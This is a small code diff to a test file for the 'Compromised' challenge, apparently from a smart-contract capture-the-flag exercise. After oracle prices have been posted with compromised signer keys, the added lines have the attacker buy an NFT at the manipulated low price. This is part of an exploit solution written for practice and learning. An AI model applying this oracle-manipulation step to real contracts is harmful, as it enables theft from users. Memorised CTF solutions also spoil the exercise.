@@ -85,6 +85,8 @@ describe("Compromised challenge", function () {
     await oracle.connect(signer1).postPrice("DVNFT", NEW_PRICE);
     const signer2 = new ethers.Wallet(key2, ethers.provider);
     await oracle.connect(signer2).postPrice("DVNFT", NEW_PRICE);
+    /**Attacker buy NFT at reduced price */
+    await exchange.connect(player).buyOne({ value: NEW_PRICE });
   });
 
   after(async function () {
